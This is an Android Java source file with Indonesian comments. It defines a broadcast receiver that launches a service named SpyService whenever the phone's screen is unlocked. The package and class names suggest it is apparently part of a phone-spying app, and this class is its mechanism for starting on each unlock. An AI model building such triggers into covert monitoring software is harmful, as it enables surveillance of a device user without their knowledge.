package com.spye.spyslepp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class UnlockReceiver extends BroadcastReceiver {
    private static final String TAG = "SPY_DEBUG";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Mendeteksi aksi unlock layar
        if (Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {
            Log.d(TAG, "Layar dibuka! Memulai SpyService...");
            
            Intent serviceIntent = new Intent(context, SpyService.class);
            
            // Menjalankan service sesuai versi Android
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        }
    }
}
